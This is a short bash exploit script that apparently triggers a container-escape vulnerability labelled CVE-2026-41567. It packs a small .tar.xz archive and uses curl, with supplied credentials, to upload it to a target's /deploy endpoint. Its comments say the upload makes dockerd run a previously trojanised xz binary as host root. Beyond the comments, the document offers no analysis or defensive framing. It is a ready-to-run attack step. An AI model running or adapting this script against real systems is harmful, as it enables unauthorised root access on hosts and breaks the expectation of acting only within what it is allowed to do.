#!/usr/bin/env bash
# Trigger CVE-2026-41567: uploading a .tar.xz makes dockerd run
# the container's (now trojanised) /usr/bin/xz as host root.
# usage: ./trigger.sh <target-ip> <user> <pass>
set -euo pipefail

TARGET=${1:?usage: trigger.sh <target-ip> <user> <pass>}
USER=${2:?}
PASS=${3:?}

TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT
echo trigger > "$TMP/t"
tar -C "$TMP" -cf - t | xz > "$TMP/trigger.tar.xz"

echo "[*] uploading trigger.tar.xz (500 is expected)"
curl -s -o /dev/null -w 'HTTP %{http_code}\n' \
     -u "$USER:$PASS" \
     -F "archive=@$TMP/trigger.tar.xz" -F 'workspace=/workspace' \
     "http://$TARGET/deploy" || true
